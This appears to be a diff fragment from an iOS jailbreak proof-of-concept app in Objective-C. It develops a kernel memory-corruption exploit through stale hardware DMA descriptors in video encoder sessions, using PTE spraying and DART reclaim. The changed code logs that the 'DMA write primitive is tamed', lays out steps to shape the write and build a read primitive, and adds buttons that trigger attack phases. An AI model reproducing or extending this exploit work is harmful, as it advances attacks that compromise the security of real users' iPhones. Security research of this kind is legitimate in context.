-        os_log(eLog, "JBPoC-EXP3 RESULT CORRUPTION_CONFIRMED hits=%d firstFrame=%d inputHit=%d",
-               hitCount, firstHitFrame, inputDiffs);
-    } else {
-        INFO(@"No bitstream anomalies detected.");
-        pocLog(@"");
-        INFO(@"Interpretation — check panic .ips DVA:");
-        INFO(@"1. DVA in clone's PTE range (0x1c4-0x20b) → reclaim WORKED,");
-        INFO(@"   corruption in buffer but ISR memcpy path missed it.");
-        INFO(@"   → Refine: target dva+0x1270 region, or use raw-IOKit path.");
-        INFO(@"2. DVA outside clone's range → reclaim placement FAILED.");
-        INFO(@"   Alpha=255→0 may have changed InfoSet → different DVA.");
-        INFO(@"   → Fix: match Alpha in clone, or use raw-IOKit CONFIGURE.");
-        INFO(@"3. No panic, no hits → stale descriptor didn't fire in window.");
-        INFO(@"   → Extend poll, or fire needs session state (revisit).");
-        INFO(@"4. Panic during PHASE 3 (FREE) → F≈U: fire synchronized");
-        INFO(@"   with unmap. ARM→FREE→CLONE can never succeed.");
-        INFO(@"   → Need D-prep-2-style keep-alive variant.");
-        INFO(@"5. Write hit a surface ISR memcpy doesn't copy into output.");
-        INFO(@"   (corruption in coded buffer but not in CMSampleBuffer).");
-        INFO(@"   → Need Ghidra surface-index mapping of ISR memcpy source.");
-        if (inputDiffs > 0) {
-            PASS(@"BUT: Input surface DID change (%d bytes)!", inputDiffs);
-            LOG(@"The stale descriptor hit an external mapping — this is");
-            LOG(@"actually a BETTER primitive (direct read of the write).");
-        }
-        os_log(eLog, "JBPoC-EXP3 RESULT NO_BITSTREAM_HITS inputHit=%d", inputDiffs);
-    }
+    PASS(@"*** MODE A3: FULL SURVIVAL ***");
+    LOG(@"Soak survived: stale DMA absorbed by spray sessions.");
+    LOG(@"Uncover survived: single fire event, already absorbed.");
+    LOG(@"Spray: %d thin + %d fat sessions.", thinCount, fatCount);
+    pocLog(@"");
+    LOG(@"CONFIRMED: spray PTE coverage captured the stale write.");
+    LOG(@"The hardware DMA write primitive is tamed.");
+    pocLog(@"");
+    LOG(@"Next: add output buffer scan to locate WHERE the write landed,");
+    LOG(@"shape the write (control DVA offset + written data),");
+    LOG(@"build the read primitive (ISR memcpy path).");
     LOG(@"═══════════════════════════════════════════════");
 
-    // Write results
     NSString *resultStr = [NSString stringWithFormat:
-        @"EXP3 MODE A RESULT\nDate: %@\nBitstream hits: %d\nFirst hit frame: %d\n"
-        @"Input surface diffs: %d\nBaseline frames: %d\nClone frames: %d\n"
-        @"Total poll: %ds\nHit report:\n%@\n",
-        [NSDate date], hitCount, firstHitFrame, inputDiffs,
-        baselineCount, finalCount, EXP3_POLL_SECS, hitReport];
+        @"EXP3 MODE A3 (PTE spray + soak + uncover) — FULL SURVIVAL\n"
+        @"Date: %@\nThin sprays: %d\nFat sprays: %d\n"
+        @"Soak: SURVIVED (%ds)\nUncover: SURVIVED (%ds)\n"
+        @"Baseline frames: %d\n",
+        [NSDate date], thinCount, fatCount,
+        EXP3_SOAK_SECS, EXP3_UNCOVER_SECS, baselineCount];
     NSString *resultPath = [NSHomeDirectory()
         stringByAppendingPathComponent:@"Documents/exp3_result.txt"];
     [resultStr writeToFile:resultPath atomically:YES
                   encoding:NSUTF8StringEncoding error:nil];
     INFO(@"Results written to %@", resultPath);
 
-    // Cleanup
-    VTCompressionSessionInvalidate(cloneSession);
-    CFRelease(cloneSession);
-    CVPixelBufferRelease(clonePB);
     exp3FreeSamples();
-    for (int i = 0; i < (int)baselineData.count; i++) {
-        // NSArray retains, autoreleased
-    }
 
-    PASS(@"Exp 3.0 complete. Device may panic from stale descriptor.");
-    LOG(@"Keep the panic .ips if it happens!");
+    PASS(@"Exp 3.0 Mode A3 complete.");
+    exp3Mark(@"COMPLETE");
+    g_exp3Running = NO;
 }
 
 // ============================================================
@@ -5512,7 +5568,7 @@ static void runTier2Probe(void) {
 
     // Run C1/C2 buttons — row 8: fire-control tests
     CGFloat row8 = row7 + btnH + gap;
-    CGFloat runCBtnW = (w - pad * 2 - gap) / 2;
+    CGFloat runCBtnW = (w - pad * 2 - gap * 2) / 3;
 
     UIButton *runCBtn = [UIButton buttonWithType:UIButtonTypeSystem];
     runCBtn.frame = CGRectMake(pad, row8, runCBtnW, btnH);
@@ -5520,8 +5576,8 @@ static void runTier2Probe(void) {
     runCBtn.layer.cornerRadius = 8;
     runCBtn.layer.borderWidth = 2;
     runCBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1].CGColor;
-    runCBtn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
-    [runCBtn setTitle:@"C1: Client Death" forState:UIControlStateNormal];
+    runCBtn.titleLabel.font = [UIFont boldSystemFontOfSize:10];
+    [runCBtn setTitle:@"C1: Client" forState:UIControlStateNormal];
     [runCBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1] forState:UIControlStateNormal];
     [runCBtn addTarget:self action:@selector(runRunC1) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:runCBtn];
@@ -5532,11 +5588,23 @@ static void runTier2Probe(void) {
     runCAltBtn.layer.cornerRadius = 8;
     runCAltBtn.layer.borderWidth = 2;
     runCAltBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1].CGColor;
-    runCAltBtn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
-    [runCAltBtn setTitle:@"C2: Daemon Kill" forState:UIControlStateNormal];
+    runCAltBtn.titleLabel.font = [UIFont boldSystemFontOfSize:10];
+    [runCAltBtn setTitle:@"C2: Daemon" forState:UIControlStateNormal];
     [runCAltBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1] forState:UIControlStateNormal];
     [runCAltBtn addTarget:self action:@selector(runRunC2) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:runCAltBtn];
+
+    UIButton *c2ekBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    c2ekBtn.frame = CGRectMake(pad + (runCBtnW + gap) * 2, row8, runCBtnW, btnH);
+    c2ekBtn.backgroundColor = [UIColor colorWithRed:0.6 green:0.0 blue:0.0 alpha:1];
+    c2ekBtn.layer.cornerRadius = 8;
+    c2ekBtn.layer.borderWidth = 2;
+    c2ekBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.3 blue:0.3 alpha:1].CGColor;
+    c2ekBtn.titleLabel.font = [UIFont boldSystemFontOfSize:10];
+    [c2ekBtn setTitle:@"C2-EK: Fire?" forState:UIControlStateNormal];
+    [c2ekBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.3 blue:0.3 alpha:1] forState:UIControlStateNormal];
+    [c2ekBtn addTarget:self action:@selector(runC2EarlyKill) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:c2ekBtn];
 
     // D-prep button — row 9: in-place surface readout (Model b test)
     CGFloat row9 = row8 + btnH + gap;
@@ -5577,7 +5645,7 @@ static void runTier2Probe(void) {
     exp3Btn.layer.borderWidth = 2;
     exp3Btn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1].CGColor;
     exp3Btn.titleLabel.font = [UIFont boldSystemFontOfSize:13];
-    [exp3Btn setTitle:@"Exp 3.0: Mode A DART Re-claim" forState:UIControlStateNormal];
+    [exp3Btn setTitle:@"Exp 3.0: Mode A3 PTE Spray" forState:UIControlStateNormal];
     [exp3Btn setTitleColor:[UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1] forState:UIControlStateNormal];
     [exp3Btn addTarget:self action:@selector(runExp3) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:exp3Btn];
@@ -5718,6 +5786,12 @@ static void runTier2Probe(void) {
 - (void)runRunC2 {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runRunC2();
+    });
+}
+
+- (void)runC2EarlyKill {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runC2EarlyKill();
     });
 }
 
